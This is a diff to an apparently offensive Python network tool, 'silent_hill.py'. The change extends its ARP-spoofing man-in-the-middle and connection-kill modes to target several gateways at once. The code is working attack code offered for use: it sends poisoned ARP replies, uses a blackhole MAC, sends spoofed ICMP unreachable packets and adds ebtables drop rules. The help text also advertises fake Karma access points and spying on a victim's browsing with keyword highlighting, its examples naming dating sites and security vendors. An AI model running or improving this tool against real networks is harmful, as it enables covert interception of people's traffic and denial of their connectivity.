@@ -44,6 +44,7 @@ Debug_display = f'''
     sudo python silent_hill.py -d -n 192.168.1.0/24
     sudo python silent_hill.py -l -i wlan0
     sudo python silent_hill.py -s -i wlan0 -r 192.168.1.1 -t 192.168.1.93
+    sudo python silent_hill.py -s -i wlan0 -r 192.168.1.24 -r 192.168.1.55 -r 192.168.1.87 -t 192.168.1.93
     sudo python silent_hill.py -k -r 192.168.1.1 -i wlan0 -t 192.168.1.46
     sudo python silent_hill.py --karma-scan --karma-interface wlan0
     sudo python silent_hill.py --karma free_wifi --karma-interface wlan0 --karma-interface-internet wlan1 --karma-listen
@@ -134,7 +135,9 @@ found_hosts = []
 seen_hosts = {}
 
 victim_ip = ""
-gateway_ip = ""
+gateway_ips = set()
+
+
 iface_spy = ""
 
 victim_mac = None
@@ -252,32 +255,46 @@ def enable_ip_forwarding():
     os.system("iptables -t nat -A POSTROUTING -o {} -j MASQUERADE".format(iface_spy))
 
 
+gateway_macs = {}
 def spoof():
-    global victim_mac, gateway_mac
+    global victim_mac, gateway_ips, gateway_macs
     victim_mac = get_mac(victim_ip)
-    gateway_mac = get_mac(gateway_ip)
+    for gw_ip in gateway_ips:
+        gw_mac = get_mac(gw_ip)
+        if gw_mac:
+            gateway_macs[gw_ip] = gw_mac
+            print(f"[+] Gateway {gw_ip} -> {gw_mac}")
+        else:
+            print(f"[-] MAC not found for {gw_ip}, skipping")
 
-    if not victim_mac or not gateway_mac:
+    if not victim_mac or not gateway_macs:
         print(f"[-] {R}MAC not found. Exiting{RESET}")
         exit(1)
 
     print("[*] Starting ARP spoofing...")
     try:
         while True:
-            pkt_to_victim = Ether(dst=victim_mac)/ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwdst=victim_mac)
-            pkt_to_gateway = Ether(dst=gateway_mac)/ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwdst=gateway_mac)
-            sendp(pkt_to_victim, iface=iface_spy, verbose=0)
-            sendp(pkt_to_gateway, iface=iface_spy, verbose=0)
-            time.sleep(2)
+            for gw_ip, gw_mac in gateway_macs.items():
+                pkt_to_victim = Ether(dst=victim_mac) / ARP(op=2, pdst=victim_ip, psrc=gw_ip, hwdst=victim_mac)
+                sendp(pkt_to_victim, iface=iface_spy, verbose=0)
+                pkt_to_gateway = Ether(dst=gw_mac) / ARP(op=2, pdst=gw_ip, psrc=victim_ip, hwdst=gw_mac)
+                sendp(pkt_to_gateway, iface=iface_spy, verbose=0)
+
+            time.sleep(0.3)
     except KeyboardInterrupt:
         pass
+
 
 # Restore ARP tables
 def restore_arp():
     print("[!] Restoring ARP tables...")
-    if victim_mac and gateway_mac:
-        sendp(Ether(dst=victim_mac)/ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwsrc=gateway_mac), count=5, iface=iface_spy, verbose=0)
-        sendp(Ether(dst=gateway_mac)/ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwsrc=victim_mac), count=5, iface=iface_spy, verbose=0)
+    if not victim_mac or not gateway_macs:
+        return
+
+    for gw_ip, gw_mac in gateway_macs.items():
+        sendp(Ether(dst=victim_mac) / ARP(op=2, pdst=victim_ip, psrc=gw_ip, hwsrc=gw_mac), count=5, iface=iface_spy, verbose=0)
+        sendp(Ether(dst=gw_mac) / ARP(op=2, pdst=gw_ip, psrc=victim_ip, hwsrc=victim_mac), count=5, iface=iface_spy, verbose=0)
+
 
 def get_ip_info(ip):
     if ip in ip_info_cache:
@@ -2979,23 +2996,24 @@ def print_devices(devices):
 
 ########################## KILL CONNEXION MODE (--kill) ##########################
 def kill_connection():
-    global victim_mac, gateway_mac
+    global victim_mac, gateway_macs
     victim_mac = get_mac(victim_ip)
-    gateway_mac = get_mac(gateway_ip)
+    for gw_ip in gateway_ips:
+        gw_mac = get_mac(gw_ip)
+        if gw_mac:
+            gateway_macs[gw_ip] = gw_mac
+            print(f"[+] Gateway {gw_ip} -> {gw_mac}")
+        else:
+            print(f"[-] MAC not found for {gw_ip}, skipping")
 
-    if not victim_mac or not gateway_mac:
+    if not victim_mac or not gateway_macs:
         print(f"[-] {R}MAC not found. Exiting{RESET}")
         exit(1)
 
     print("[*] ARP spoof with KILL mode: Killing target connexion ...")
-
-    # Disable IP forwarding to block the MITM
     os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
-
-    # Fake MAC address for blackhole (no host should have it)
     blackhole_mac = "00:00:00:00:00:00"
 
-    # Attempt to block packets at the Ethernet level (if ebtables is available)
     try:
         os.system(f"ebtables -A OUTPUT -p IPv4 --ip-src {victim_ip} -j DROP")
         os.system(f"ebtables -A FORWARD -p IPv4 --ip-src {victim_ip} -j DROP")
@@ -3006,26 +3024,29 @@ def kill_connection():
     try:
         print(f"[*] {Y}Attack running ...{RESET}")
         while True:
-            # ARP poisoning with blackhole MAC
-            pkt_to_victim = Ether(dst=victim_mac)/ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwsrc=blackhole_mac, hwdst=victim_mac)
-            pkt_to_gateway = Ether(dst=gateway_mac)/ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwsrc=blackhole_mac, hwdst=gateway_mac)
+            for gw_ip, gw_mac in gateway_macs.items():
+                # ARP poisoning victim
+                pkt_to_victim = Ether(dst=victim_mac) / ARP(op=2, pdst=victim_ip, psrc=gw_ip, hwsrc=blackhole_mac, hwdst=victim_mac)
+                sendp(pkt_to_victim, iface=iface_spy, verbose=0)
 
-            sendp(pkt_to_victim, iface=iface_spy, verbose=0)
-            sendp(pkt_to_gateway, iface=iface_spy, verbose=0)
+                # ARP poisoning gateway
+                pkt_to_gateway = Ether(dst=gw_mac) / ARP(op=2, pdst=gw_ip, psrc=victim_ip, hwsrc=blackhole_mac, hwdst=gw_mac)
+                sendp(pkt_to_gateway, iface=iface_spy, verbose=0)
 
-            # Send an ICMP Host Unreachable to force the connection to drop
-            icmp_unreachable = IP(dst=victim_ip, src=gateway_ip)/ICMP(type=3, code=1)
-            send(icmp_unreachable, verbose=0)
+                # ICMP Host Unreachable (un par gateway)
+                icmp_unreachable = Ether(dst=gw_mac) / IP(dst=victim_ip, src=gw_ip) / ICMP(type=3, code=1)
+                sendp(icmp_unreachable, iface=iface_spy, verbose=0)
 
-            time.sleep(1)
+            time.sleep(0.2)
     except KeyboardInterrupt:
         print(f"\n[*] {R}Ctrl + C detected. Closing ...{RESET}")
         restore_arp()
-        # Clean up ebtables rules if possible
         os.system(f"ebtables -D OUTPUT -p IPv4 --ip-src {victim_ip} -j DROP")
         os.system(f"ebtables -D FORWARD -p IPv4 --ip-src {victim_ip} -j DROP")
         print("[*] Ebtables rules removed")
         sys.exit(0)
+
+
 
 ########################## KAMRMA SCANNER ##########################
 def set_monitor_mode(interface, karma_mode):
@@ -3321,10 +3342,7 @@ def monitor_connected_clients():
                     old_status = client_status.get(mac)
 
                     if old_status != new_status:
-                        print(
-                            f"{current_time()} {Y}→ CLient detected:{RESET} {mac} | IP: {R}{ip}{RESET} | Hostname: {hostname} "
-                            f"→ {G if new_status == 'CONNECTED' else R}{new_status}{RESET}"
-                        )
+                        print(f"{current_time()} {Y}→ CLient detected:{RESET} {mac} | IP: {R}{ip}{RESET} | Hostname: {hostname} → {G if new_status == 'CONNECTED' else R}{new_status}{RESET}")
                         client_status[mac] = new_status
                 else:
                     print(f"{current_time()} {R}Invalid record: {line.strip()}{RESET}")
@@ -3360,7 +3378,7 @@ def cleanup(signal_received=None, frame=None):
 
 ########################## MAIN ##########################
 def main():
-    global victim_ip, gateway_ip, iface_spy, start_iface, karma_interface, INTERNET_INTERFACE, ESSID_fakeAP, highlight_keywords_list, current_channel, summary, MY_IP, PACKET_FILTER, EXCLUDE_SMB_FOLDERS
+    global victim_ip, gateway_ips, iface_spy, start_iface, karma_interface, INTERNET_INTERFACE, ESSID_fakeAP, highlight_keywords_list, current_channel, summary, MY_IP, PACKET_FILTER, EXCLUDE_SMB_FOLDERS
     print(banner)
     parser = argparse.ArgumentParser(description="Silence reveals what noise conceals")
     parser.add_argument("--network", "-n", help="IP range to scan (e.g., 192.168.1.0/24)")
@@ -3373,7 +3391,7 @@ def main():
     parser.add_argument("--highlight", "-hi", help="Keywords to highlight during --spy observation (ex : --highlight tinder,badoo,grindr,pornhub or : --highlight sentinelone,crowdstrike,company)", type=str)
     parser.add_argument("--kill", "-k", help="Kill ARP connexion from target (--target, --router, and --interface required)", action='store_true')
     parser.add_argument("--target", "-t", help="Target IP to monitor")
-    parser.add_argument("--router", "-r", help="Network router IP")
+    parser.add_argument("--router", "-r", action="append", dest="routers", default=[], metavar="IP",help="Network router IP (Supports multiple route: -r 192.168.1.5 -r 192.168.1.254)")
     parser.add_argument("--interface", "-i", help="Network interface to use (e.g., eth0)")
     parser.add_argument("--karma-scan", "-ks", help="Sniff probe requests and show ESSIDs + MACs with --karma-interface", action="store_true")
     parser.add_argument("--karma", "-ka", help="Setup fake OPEN AP (Insert probed ESSID from karma attack for exemple). --karma ESSID_NAME (need an other interface : --karma-interface). Use --kill-karma to end AP")
@@ -3417,13 +3435,13 @@ def main():
             f.write(karma_interface)
 
         setup()
-        gateway_ip = get_default_gateway()
-        print(f"[!] Router IP: {Y}{gateway_ip}{RESET}")
+        router_ip = get_default_gateway()
+        print(f"[!] Router IP: {Y}{router_ip}{RESET}")
         print(f"[!] Client range network: {Y}192.168.99.0/24{RESET}")
         print(f"[!] Traffic AP: {Y}{karma_interface}{RESET}")
         print(f"[!] {Y}Karma AP running ...{RESET}")
         print(f"[!] Discover clients: {Y}sudo python silent_hill.py -d -n 192.168.99.0/24 --interface {karma_interface}{RESET}")
-        print(f"[!] Spy on clients: {Y}sudo python silent_hill.py -s -i {karma_interface} -r {gateway_ip} -t <TARGET_IP>{RESET}")
+        print(f"[!] Spy on clients: {Y}sudo python silent_hill.py -s -i {karma_interface} -r {router_ip} -t <TARGET_IP>{RESET}")
         print(f"[!] Close Karma AP: {Y}sudo python silent_hill.py --kill-karma{RESET}\n")
 
     if args.karma_listen:
@@ -3462,12 +3480,11 @@ def main():
         thread_beacon.join()
         thread_sniff.join()
 
-
     if args.kill:
         if not args.target:
             print(f"[!] {R}Missing argument: --target")
             exit(1)
-        if not args.router:
+        if not args.routers:
             print(f"[!] {R}Missing argument: --router")
             exit(1)
         if not args.interface:
@@ -3475,7 +3492,7 @@ def main():
             exit(1)
 
         victim_ip = args.target
-        gateway_ip = args.router
+        gateway_ips.update(args.routers)
         iface_spy = args.interface
 
         signal.signal(signal.SIGINT, signal_handler2)
@@ -3485,7 +3502,7 @@ def main():
         if not args.target:
             print(f"[!] {R}Missing argument: --target")
             exit(1)
-        if not args.router:
+        if not args.routers:
             print(f"[!] {R}Missing argument: --router")
             exit(1)
         if not args.interface:
@@ -3493,7 +3510,7 @@ def main():
             exit(1)
 
         victim_ip = args.target
-        gateway_ip = args.router
+        gateway_ips.update(args.routers)
         iface_spy = args.interface
 
         signal.signal(signal.SIGINT, signal_handler)
